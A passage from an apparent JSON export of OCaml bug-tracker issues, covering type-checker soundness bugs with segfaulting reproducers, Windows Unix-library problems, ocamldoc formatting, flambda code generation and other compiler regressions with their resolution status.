`generalize_structure` ignores variables which have already been generalized. This means that instead of generalizing variables which occur only in covariant positions, we generalize any variable which is first encountered in a covariant position.\r\n\r\nFor example, the following code is allowed and results in a segmentation fault:\r\n\r\n          OCaml version 4.03.0\r\n\r\n  # #principal true;;\r\n  # module M : sig\r\n      type (+'a, -'b) foo\r\n      val apply : ('a, 'b) foo -> 'b -> 'a\r\n      val f : unit -> ('a, 'a) foo\r\n    end = struct\r\n      type ('a, 'b) foo = 'b -> 'a\r\n      let apply f x = f x\r\n      let f () =\r\n        let r = ref None in\r\n          fun x ->\r\n            match !r with\r\n            | None -> r := Some x; x\r\n            | Some y -> r := Some x; y\r\n    end;;\r\n  module M :\r\n    sig\r\n      type (+'a, -'b) foo\r\n      val apply : ('a, 'b) foo -> 'b -> 'a\r\n      val f : unit -> ('a, 'a) foo\r\n    end\r\n  # let f = M.f ();;\r\n  val f : ('a, 'a) M.foo = <abstr>\r\n  # M.apply f 0;;\r\n  - : int = 0\r\n  # print_endline (M.apply f \"World\");;\r\n\r\n  Process ocaml-toplevel segmentation fault (core dumped)\r\n\r\nReversing the order of the type arguments of `M.foo` gives a type error as expected, since the variable is encountered in a contravariant position first.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7284\n**Reporter:** @lpw25\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:05Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.03.0\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Monitored by:** @alainfrisch\n\n## Bug description\n\nI think that this condition in `mcomp_fields`:\r\n\r\n  if miss1 <> []  && (object_row ty1).desc = Tnil\r\n  || miss2 <> []  && (object_row ty2).desc = Tnil then raise (Unify []);\r\n\r\nis supposed to be:\r\n\r\n  if miss1 <> []  && (object_row ty2).desc = Tnil\r\n  || miss2 <> []  && (object_row ty1).desc = Tnil then raise (Unify []);\r\n\r\nAs it stands the check treats some compatible types as incompatible. For example, the following code gives a segmentation fault:\r\n\r\n  module type S = sig\r\n\r\n    type o1 = < bar : int; foo : int >\r\n    type o2 = private < foo : int; .. >\r\n\r\n    type v1 = T of o1\r\n    type v2 = T of o2\r\n\r\n  end\r\n\r\n  module M = struct\r\n\r\n    type o1 = < bar : int; foo : int >\r\n    type o2 = o1\r\n\r\n    type v1 = T of o1\r\n    type v2 = v1 = T of o2\r\n\r\n  end\r\n\r\n  module F(X : S) = struct\r\n\r\n    type 'a wit =\r\n    | V1 : string -> X.v1 wit\r\n    | V2 : int -> X.v2 wit\r\n\r\n    let f : X.v1 wit -> unit = function V1 s -> print_endline s\r\n\r\n  end\r\n\r\n  module N = F(M)\r\n\r\n  let () = N.f (N.V2 0)\n"},{"labels":["bug"],"text":"**Original bug ID:** 7282\n**Reporter:** @dra27\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:03Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** tweak\n**Version:** 3.09.0\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nWarning 27 triggers on an optional argument if the variable isn't used in the code. The warning either shouldn't trigger, or should have a separate number.\n\n## Steps to reproduce\n\nlet foo ?bar () = ()\r\nin\r\nf ()\r\n\r\n$ ocamlc -w +27 foo.ml\r\n\r\nFile \"foo.ml\", line 1, characters 9-12:\r\nWarning 27: unused variable bar.\n\n## Additional information\n\nThis is a nuisance when writing functions designed to match a module type. In all (?) other cases, there is a syntax for working around this (e.g. prefixing with _ or just using the wildcard character)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7281\n**Reporter:** olh\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-07-24T16:13:20Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** Linux\n**OS:** openSUSE\n**OS Version:** Tumbleweed\n**Version:** 4.03.0\n**Target version:** later\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** ocamldoc\n\n## Bug description\n\nThe troff .TH macro takes up to three extra args, according to the groff documentation at gnu.org. ocamldoc inserts a fourth argument \"source:\".\n\n## Steps to reproduce\n\n$ man Arg | sed -n '1p;$p' | awk '{print $1,$2,$3}'\r\nArg(3) OCamldoc Arg(3)\r\n2016-06-16 source: Arg(3)\r\n\r\nw3m https://www.gnu.org/software/groff/manual/html_node/Man-usage.html\n\n## File attachments\n\n- [ocamldoc-man-th.patch](https://gist.githubusercontent.com/vicuna/b641b5693870ff3206b7135671ae0ed4/raw/dd41458330c2ad863224c86a49f6dc170daf493d/ocamldoc-man-th.patch)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7279\n**Reporter:** sawfish\n**Status:** resolved (set by @damiendoligez on 2017-02-23T15:56:30Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** standard library\n**Monitored by:** braibant @gasche\n\n## Bug description\n\nIf custom blocks are stored in weak sets obtained by Weak.Make, their finalizers are sometimes called more than once.\r\n\r\nThere has been a discussion on the OCaml mailing list regarding this issue:\r\nhttps://sympa.inria.fr/sympa/arc/caml-list/2016-06/msg00070.html\r\n\r\nAs a bottom line, the assumption was that the behavior may be related to shallow copies that are created by Weak.get_copy during lookup operations.\r\n\r\nThe bug is reproducible since OCaml 4.02.0 but does not occur in earlier versions. As an exception, the first beta release of OCaml 4.03.0 does not exhibit the bug, whereas it reproduces in the final 4.03.0 release.\n\n## Steps to reproduce\n\nA github repository with a minimal example that reproduces the error is available at https://github.com/martin-neuhaeusser/ocaml_bug/\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7278\n**Reporter:** @chambart\n**Assigned to:** @alainfrisch\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:01Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.03.0\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nPrivate records shouldn't be mutable, but the check is not applied for inline records.\r\n\r\nFor instance this shouldn't be accepted:\r\n\r\n  type a = private A of { mutable i : int }\r\n  let f (A r) = r.i <- 3\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7276\n**Reporter:** djs55\n**Assigned to:** @alainfrisch\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:59Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.03.0\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** platform support (windows, cross-compilation, etc)\n**Related to:** #5563\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nHi,\r\n\r\nOn Windows there's a problem with the Unix.select fast path used when all\r\nthe fds are sockets: the MSDN docs for select[1] say\r\n\r\n> The variable FD_SETSIZE determines the maximum number of descriptors in\r\n> a set. (The default value of FD_SETSIZE is 64, which can be modified by\r\n> defining FD_SETSIZE to another value before including Winsock2.h.)\r\n\r\nWith the default FD_SETSIZE of 64, if the sockets list is of length 65+\r\nthen later sockets will be silently ignored. The attached program demonstrates\r\nthis effect on OCaml 4.03 and 4.02.3.\r\n\r\nA possible fix appears to be to fall back to the slow path for lists of fds greater\r\nthan FD_SETSIZE (like we do already for list of fds of varying types).\r\nFor example the following patch:\r\n\r\ndiff --git a/otherlibs/win32unix/select.c b/otherlibs/win32unix/select.c\r\nindex 0e21db8..b592e3a 100644\r\n--- a/otherlibs/win32unix/select.c\r\n+++ b/otherlibs/win32unix/select.c\r\n@@ -909,9 +909,12 @@ static int fdlist_to_fdset(value fdlist, fd_set *fdset)\r\n {\r\n   value l, c;\r\n   FD_ZERO(fdset);\r\n+  int used = 0;\r\n   for (l = fdlist; l != Val_int(0); l = Field(l, 1)) {\r\n     c = Field(l, 0);\r\n     if (Descr_kind_val(c) == KIND_SOCKET) {\r\n+      used++;\r\n+      if (used > FD_SETSIZE) return 0;\r\n       FD_SET(Socket_val(c), fdset);\r\n     } else {\r\n       DEBUG_PRINT(\"Non socket value encountered\");\r\n\r\nThis is similar to \"#5563: harden Unix.select against file descriptors\r\nabove FD_SETSIZE\" except that we can still handle these larger lists using\r\nthe more generic (but more complicated) path.\r\n\r\n\r\n[1] https://msdn.microsoft.com/en-gb/library/windows/desktop/ms740141(v=vs.85).aspx\n\n## Steps to reproduce\n\nOn Windows (I'm using the cygwin based installer from https://fdopen.github.io/opam-repository-mingw/)\r\n\r\nocamlfind ocamlopt -package unix -linkpkg -o test.exe test.ml\r\n./test.exe\r\n\r\nFor me the large Unix.select will time out and the program prints \"ERROR\" and exits with code 1. On OSX and on Windows with the patch above applied, it prints \"OK\" and exits with code 0.\n\n## Additional information\n\nI encountered this when filtering all network connections from a VM through the Mirage TCP/IP stack and out into the Internet via regular sockets. Occasionally the I/O would stop (but other Lwt timer threads continue), and then after some timeout it would wake up again. I believe this is because the list of active socket connections was > 64 and all the activity was on the fds at the end of the list.\n\n## File attachments\n\n- [test.ml](https://gist.githubusercontent.com/vicuna/6759ac61d631a8ec22430a7b0ddab853/raw/e2e7a131ec3e5dd91831255cf81056329793846d/test.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7273\n**Reporter:** MonsieurPi\n**Assigned to:** @gasche\n**Status:** closed (set by @gasche on 2016-06-15T18:54:54Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Category:** documentation\n**Monitored by:** MonsieurPi\n\n## Bug description\n\nThe operator (^) disappeared from the String documentation and in the Bytes documentation we can find the function cat but no mention to (^). \r\n\r\nThis is strange because I kind of remember reading in the documentation that the use of (^) was not adviced but since it still exists, it would be great to have it documented. \r\n\r\nFor a beginner in OCaml, reading the module documentation makes him/her think that there is no other way than String.concat \"\" [s1; s2] to concatenate s1 and s2.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7272\n**Reporter:** olh\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-02-18T19:59:07Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** Linux\n**OS:** openSUSE\n**OS Version:** Tumbleweed\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.04.0\n**Category:** documentation\n**Related to:** #6341\n**Monitored by:** @gasche\n\n## Bug description\n\nEach module has an html file, like libref/Arg.html. In this file there a link to the types, like \"Module Arg\" which links to libref/type_Arg.html.\r\nIn 4.02.3 the html code has several [br] tags to force a newline.\r\nIn 4.03 these [br] tags are missing.\r\n\r\nThis happens in all created files by ocamldoc.\r\n\r\nIts appearently broken upstream as well.\n\n## Steps to reproduce\n\nCompare these two URLs:\r\n\r\nhttp://caml.inria.fr/pub/docs/manual-ocaml-4.02/libref/type_Arg.html\r\nvs.\r\nhttp://caml.inria.fr/pub/docs/manual-ocaml-4.03/libref/type_Arg.html\n"},{"labels":["bug"],"text":"**Original bug ID:** 7271\n**Reporter:** furuse\n**Status:** resolved (set by @xavierleroy on 2017-10-19T14:16:37Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** misc\n**Related to:** #6509\n**Monitored by:** @gasche\n\n## Bug description\n\nI wrote a code like the following to enforce a compilation unit M linked.  In bytecode, it works fine:\r\n\r\nif false then M.f ()  (* dummy code to make sure M is linked. *)\r\n\r\nHowever, ocamlopt seems to erase the entire expression.  As a result the reference to M is lost and M is never linked together.  The intention of linking of M is to execute an initialization side effect in M.\r\n\r\nThis is very confusing behaviour difference between ocamlc and ocamlopt.  If it is not a bug, it should be noted in OCaml reference manual 11.5: \"Compatibility with the bytecode compiler\".\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7270\n**Reporter:** @jhjourdan\n**Status:** closed (set by @damiendoligez on 2016-09-02T16:01:15Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Platform:** x86-64\n**OS:** Linux\n**Version:** 4.03.1+dev\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** runtime system and C interface\n**Monitored by:** @gasche\n\n## Bug description\n\nThe failing test is misc/weaktest.ml\r\n\r\nThe error message :\r\n   ocamlcfile major_gc.c; line 402 ### Assertion failed: end > start\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7269\n**Reporter:** @stedolan\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:56Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Version:** 4.03.0\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Child of:** #5998\n**Monitored by:** @gasche @yallop @hcarty\n\n## Bug description\n\nThe following program segfaults in 4.03.0 (but not previous versions):\r\n\r\n    type s = [`A | `B] and sub = [`B]\r\n    type +'a t = T : [< `Conj of 'a & sub | `Other of string] -> 'a t\r\n    let f (T (`Other msg) : s t) = print_string msg\r\n    let _ = f (T (`Conj `B) :> s t)\r\n\r\nThe issue is that (`Conj of [`A|`B] & [`B]) is judged impossible, since [`A|`B] and [`B] do not unify, and therefore the pattern matching that f does is considered exhaustive. However, I can in fact construct a (`Conj of [`A|`B] & [`B]), because covariance yields one from a `Conj [`B].\r\n\r\nI am unsure exactly what & represents. On one hand, it seems like an intersection or subtyping meet (which should be covariant in both arguments), and on the other it seems like a delayed unification (which should not).\r\n\r\nThe example uses GADTs, but I don't think they're essential. GADTs are the easiest way to keep a row variable around (the row is existentially quantified), which is necessary to exhibit the bug. I suspect it would also come up with modules and private row types.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7268\n**Reporter:** persol\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2016-07-13T15:42:40Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.03.0\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** platform support (windows, cross-compilation, etc)\n**Monitored by:** antron @gasche @diml\n\n## Bug description\n\nocamlc.opt, can not link to unix.cma on cygwin32/cygwin64\n\n## Steps to reproduce\n\n$ uname -rsv\r\nCYGWIN_NT-10.0-WOW 2.5.1(0.297/5/3) 2016-04-21 22:12\r\n$ cat foo.ml\r\nlet () = print_float (Unix.gettimeofday ()); print_newline ()\r\n$ ocamlc.opt -o foo unix.cma foo.ml\r\nError: Error on dynamically loaded library:  /home/pela/.opam/4.03.0/lib/ocaml/stublibs/dllunix.so: Cannot resolve caml_debugger_cleanup_fork\n\n## Additional information\n\nocamlc works fine\r\n\r\nThis is a show stopper because ocamlbuild uses ocamlc.opt with the consequence that many opam packages now can't be installed\r\n\r\nHave tested this on both cygwin32 and cygwin64 with the same result\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7266\n**Reporter:** arshad01\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:57Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Platform:** Mac OSX\n**OS:** OSX El Capitan\n**OS Version:** 10.11.5\n**Version:** 4.03.0\n**Category:** back end (clambda to assembly)\n**Monitored by:** arshad01 @gasche\n\n## Bug description\n\nHello\r\n\r\nThis may not be a bug but an error of usage. \r\n\r\nI have simple example where I am using \"ocaml_main\" in a C program to run Ocaml runtime. But the linking phase is generating duplicate symbol errors. Please see the attached files for details.\r\n\r\nAny help is greatly appreciated.\r\n\r\nArshad\n\n## Steps to reproduce\n\nUnzip the archive and then run the build_testo.sh script.\n\n## Additional information\n\nfiles in zip:\r\n1. testo.ml  -> Ocaml code\r\n2. testo.c  -> C code calling ocaml_main\r\n3. build_testo.sh -> shell script to build the example\r\n4. error.txt -> Error text\r\n5. ocaml-config.txt -> Ocamlopt config info generated using ocamlopt -config\n\n## File attachments\n\n- [ocamlopt_issue.zip](https://gist.githubusercontent.com/vicuna/6b7d8278f5dc5af080dff583248fbf60/raw/a4e143ea738c7aa46013df078ddd766e255cd54c/ocamlopt_issue.zip)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7265\n**Reporter:** aha\n**Assigned to:** @diml\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:23Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** platform support (windows, cross-compilation, etc)\n**Monitored by:** @gasche @diml\n\n## Bug description\n\nUnix.fstat now throws an exception for file handles of FILE_TYPE_CHAR. And it reports the wrong file kind for FILE_TYPE_PIPE.\r\n\r\nBecause Unix.isatty is implemented with Unix.fstat, it's broken (and therefore utop and all similar software, that either use Unix.isatty or pass something of FILE_TYPE_CHAR to it)\n\n## Steps to reproduce\n\n4.02.3 behavior on windows (identical to *nix)\r\n\r\nlet a,b = Unix.pipe () ;;\r\nassert ( (Unix.fstat a).Unix.st_kind = Unix.S_FIFO );;\r\nassert ( (Unix.fstat Unix.stdin).Unix.st_kind = Unix.S_CHR );; (* if Unix.stdin is a terminal, of course *)\r\n\r\n4.03.0 behaviour on windows\r\n\r\nlet a,b = Unix.pipe () ;;\r\nassert ( (Unix.fstat a).Unix.st_kind = Unix.S_REG );;\r\nassert ( try ignore(Unix.fstat Unix.stdin); false with | Unix.Unix_error(Unix.EBADF,\"fstat\",_) -> true);;\n\n## Additional information\n\nNote, if you start the ocaml toplevel from within cygwin (mintty,urxvt), cygwin adds its magic. Unix.stdin/stdout/stderr will be of type FILE_TYPE_PIPE, not  FILE_TYPE_CHAR. So the steps to reproduce wont work as intended.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7264\n**Reporter:** @dra27\n**Status:** resolved (set by @xavierleroy on 2017-02-16T08:39:02Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.02.2\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** platform support (windows, cross-compilation, etc)\n**Monitored by:** @dbuenzli\n\n## Bug description\n\nUnix.lockf on Windows seems to lock out file handles on the same file for the current process as well.\n\n## Steps to reproduce\n\nIn a toploop with unix.cma loaded:\r\n\r\n# let fd = Unix.(openfile \"foo\" [O_CREAT; O_RDWR] 0o666);;\r\nval fd : Unix.file_descr = <abstr>\r\n# Unix.(lockf fd F_LOCK 0);;\r\n- : unit = ()\r\n# Unix.(write_substring fd \"foo\" 0 3);;\r\n- : int = 3\r\n# let fd2 = Unix.(openfile \"foo\" [O_CREAT; O_RDWR] 0o666);;\r\nval fd2 : Unix.file_descr = <abstr>\r\n# Unix.(write_substring fd2 \"foo\" 0 3);;\r\nException: Unix.Unix_error (Unix.EACCES, \"write\", \"\").\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7263\n**Reporter:** gerd\n**Status:** resolved (set by @damiendoligez on 2016-09-27T13:50:24Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** block\n**Version:** 4.02.3\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** platform support (windows, cross-compilation, etc)\n**Tags:** patch\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nThe suggested Win 7 SDK (in README.win32) does not install under Win 10. Because of that I tried it with something newer, namely MSVC 14 Express For Desktop with Win 10 SDK.\r\n\r\nHowever, this leads to a problem:\r\n\r\n$ make -f Makefile.nt world\r\ncd byterun ; make -f Makefile.nt all\r\nmake[1]: Entering directory '/home/gerd/tmp/ocaml-4.02.3/byterun'\r\nflexlink -merge-manifest -stack 16777216 -exe -o ocamlrun.exe prims.obj ws2_32.lib \\\r\n          libcamlrun.lib\r\n** Cannot resolve symbols for descriptor object:\r\n ___iob_func\r\n _sprintf\n\n## Steps to reproduce\n\nFind attached my script for setting the environment variables.\n\n## Additional information\n\nThis could be an incompatibility of the libraries distributed with flexlink, because I find there the symbols __imp__sprintf and __imp____iob_func. See also this Stack Overflow article: http://stackoverflow.com/questions/30412951/unresolved-external-symbol-imp-fprintf-and-imp-iob-func-sdl2\n\n## File attachments\n\n- [env.sh](https://gist.githubusercontent.com/vicuna/6231cad37b172911300db6663ab11c96/raw/8c6b74fbf018b619147f92529bd3607060b4c5c3/env.sh)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7262\n**Reporter:** mon\n**Status:** closed (set by @mshinwell on 2016-12-08T11:31:50Z)\n**Resolution:** duplicate\n**Priority:** low\n**Severity:** minor\n**Platform:** amd64\n**OS:** linux\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** runtime system and C interface\n**Monitored by:** @gasche\n\n## Bug description\n\nraising exception from C code concatenates backtrace with backtrace from previous raise if using 4.03.0+flambda\n\n## Steps to reproduce\n\n$ opam switch 4.03.0; eval `opam config env`; make clean && make foo && ./foo \r\nrm -f *.o *.cmx *.cmi foo\r\ncc    -c -o stub.o stub.c\r\nocamlopt stub.o foo.ml -o foo\r\n------\r\n------\r\n------\r\n------\r\n$ opam switch 4.03.0+flambda; eval `opam config env`; make clean && make foo && ./foo \r\n# To setup the new switch in the current shell, you need to run:\r\neval `opam config env`\r\nrm -f *.o *.cmx *.cmi foo\r\ncc    -c -o stub.o stub.c\r\nocamlopt stub.o foo.ml -o foo\r\nCalled from file \"foo.ml\", line 7, characters 10-16\r\n------\r\nCalled from file \"foo.ml\", line 7, characters 10-16\r\nCalled from file \"foo.ml\", line 7, characters 10-16\r\n------\r\nCalled from file \"foo.ml\", line 7, characters 10-16\r\nCalled from file \"foo.ml\", line 7, characters 10-16\r\nCalled from file \"foo.ml\", line 7, characters 10-16\r\n------\r\nCalled from file \"foo.ml\", line 7, characters 10-16\r\nCalled from file \"foo.ml\", line 7, characters 10-16\r\nCalled from file \"foo.ml\", line 7, characters 10-16\r\nCalled from file \"foo.ml\", line 7, characters 10-16\r\n------\n\n## File attachments\n\n- [backtrace.tar.gz](https://gist.githubusercontent.com/vicuna/0fbf2e44c48a748313d9a37dab3af824/raw/159c0458f4f1b0d489e9d96c228066139e8b7235/backtrace.tar.gz)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7261\n**Reporter:** lebotlan\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2017-03-14T04:04:54Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** typing\n**Monitored by:** @gasche\n\n## Bug description\n\nBug summary:\r\n\r\nWhen defining a GADT,\r\ntype foo =\r\n Foo: [> `Bla ] as 'b ) * 'b -> foo\r\n\r\nis not equivalent to\r\ntype foo =\r\n Foo: 'b * 'b -> foo constraint 'b = [> `Bla ] \r\n\r\n\r\nI had expected both definitions to be equivalent.\n\n## Steps to reproduce\n\nCompile the attached file foo.ml:\r\n\r\n$ ocamlc -c foo.ml\r\nFile \"foo.ml\", line 22, characters 6-10:\r\nError: This expression has type [> `Bla ]\r\n       but an expression was expected of type $Foo_'b\r\n\r\n=> Definition 1 is broken.\r\n\r\nThen, in foo.ml, uncomment definition 2 instead of definition 1 :\r\nthat is\r\n Foo: ( [> `Bla ] as 'b ) * 'b -> foo\r\n\r\n$ ocamlc -c foo.ml\r\n\r\n=> Definition 2 is ok.\n\n## File attachments\n\n- [foo.ml](https://gist.githubusercontent.com/vicuna/60971f5d767ea8b5ebf9fed2f795d71f/raw/a5a041000d8e2171471c23e3e49b7ba4a22e238b/foo.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7260\n**Reporter:** @nojb\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:55Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Monitored by:** runhang @gasche\n\n## Bug description\n\nSee the repro below.  It crashes with Ctype.Unify(_). Tested with 4.02.3 and 4.03.0.\r\n\r\nReplacing\r\n\r\n  method foo (Dyn ty) =\r\n    match ty with\r\n    | Int -> (this :> bar)\r\n\r\nby\r\n\r\n  method foo (Dyn Int) =\r\n    (this :> bar)\r\n\r\nmakes the crash go away.\n\n## Steps to reproduce\n\ntype bar = < bar: unit >\r\n\r\ntype _ ty = Int : int ty\r\n\r\ntype dyn = Dyn : 'a ty -> dyn\r\n\r\nclass foo =\r\n  object (this)\r\n    method foo (Dyn ty) =\r\n      match ty with\r\n      | Int -> (this :> bar)\r\n  end\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7259\n**Reporter:** omion\n**Assigned to:** @chambart\n**Status:** resolved (set by @alainfrisch on 2017-10-13T18:50:51Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** middle end (typedtree to clambda)\n**Monitored by:** @gasche @Yakobowski\n\n## Bug description\n\nIn a program I've been writing, I have a few functions which return the same field of of an inline record, no matter which of the variants are chosen. For example:\r\n\r\ntype node =\r\n\t| Branch of {parent : node; bv : int; dv : int}\r\n\t| Leaf of   {parent : node; bv : int; dv : int; mutable rc : int}\r\nlet ret_p n = match n with\r\n\t| Leaf {parent} | Branch {parent} -> parent\r\n\r\nWithout flambda, my computer creates the following CMM code:\r\n(function camlTest__ret_p_1227 (n/1228: val)\r\n (catch (exit 5 (load val n/1228)) with(5 parent/1229) parent/1229))\r\n\r\nWith flambda (-O3), my computer creates this:\r\n(function camlTest__ret_p_29 (n_31/1267: val)\r\n (catch\r\n   (let switcher/1283 (load unsigned int8 (+a n_31/1267 -8))\r\n     (if (!= switcher/1283 0)\r\n       (let staticraise_arg_37/1270 (load val n_31/1267)\r\n         (exit 9 staticraise_arg_37/1270))\r\n       (let staticraise_arg_35/1269 (load val n_31/1267)\r\n         (exit 9 staticraise_arg_35/1269))))\r\n with(9 parent_32/1268) parent_32/1268))\r\n\r\nEssentially, the first version sees that parent is always the first field, so it simplifies the function down to a simple pointer lookup. The second version checks the tag and loads the first field in both branches.\r\n\r\nThe issue is the same when not using inline records (other than an extra pointer load that inline records avoid), and in this case 4.02.0 seems to be the same as 4.03.0 without flambda. This issue seems to be a regression in flambda, though I don't presume to know why.\n\n## Additional information\n\nThere are some cases when this doesn't happen though: if no fields that after the shortest record's end are mutable, the problem goes away. That is, leaving Branch alone and adding whatever you want to Leaf won't make this happen UNLESS one of the fields after dv are mutable.\r\n\r\nThis was tested on 64-bit Mac OS-X 10.11 and 64-bit MSVC-compiled Windows 10 installs.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7258\n**Reporter:** pboutill\n**Status:** resolved (set by @xavierleroy on 2017-02-18T17:16:50Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Monitored by:** @gasche\n\n## Bug description\n\nConsider the file install_printer.ml:\r\n```\r\nmodule type B =\r\n  sig\r\n    type t\r\n    val print : Format.formatter -> t -> unit\r\n  end\r\n\r\nmodule Foo :\r\nsig\r\n  module Bar : B\r\nend =\r\n  struct\r\n    module Bar : B =\r\n      struct\r\n        type t = int\r\n        let print = Format.pp_print_int\r\n      end\r\n  end\r\n\r\nmodule FooBar = Foo.Bar\r\n```\r\n\r\n```\r\n$ ocamlc -c install_printer.ml\r\n$ ocamlc -debug -o a.out install_printer.ml\r\n$ ocamldebug a.out\r\n(ocd) load_printer \"install_printer.cmo\"\r\nFile ./install_printer.cmo loaded\r\n```\r\n\r\nNow if you ```install_printer Install_printer.Foo.Bar.print``` everything is fine BUT\r\nif you ```install_printer Install_printer.FooBar.print``` it segfault under MacOS and Debian with 4.02 and 4.03\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7257\r\n**Reporter:** @hannesm\r\n**Assigned to:** @gasche\r\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:59Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Platform:** amd64\r\n**OS:** FreeBSD\r\n**Version:** 4.03.0\r\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\r\n**Category:** runtime system and C interface\r\n**Related to:** #4023\r\n\r\n## Bug description\r\n\r\nIn OCaml < 4.03, a `Unix.sleep 0` executed the syscall sleep (or nanosleep) with 0 seconds.\r\n\r\nI use this mechanism to signal to DTrace the begin and finish of a test.\r\n\r\nIn 4.03, `Unix.sleep 0` does not lead to a syscall anymore, it returns immediately.\r\n\r\n\r\nAnother regression is that sleep used to use nanosleep, but now it uses select (on this machine here), because of an unusual usage of _POSIX_C_SOURCE -- as far as I understand from http://pubs.opengroup.org/onlinepubs/009695399/functions/xsh_chap02_02.html if your code uses a specific POSIX version, you should \"#define _POSIX_C_SOURCE <ver>\", whereas sleep.c does a \"#ifdef _POSIX_C_SOURCE >= 199309L\".  FreeBSD provides \"nanosleep\" as part of libc.\r\n\r\nMy impression is that instead of _POSIX_C_SOURCE, a check in configure should be used which tests whether nanosleep is available on the system.\r\n\r\n## Additional information\r\n\r\nIt would be great to get back support for 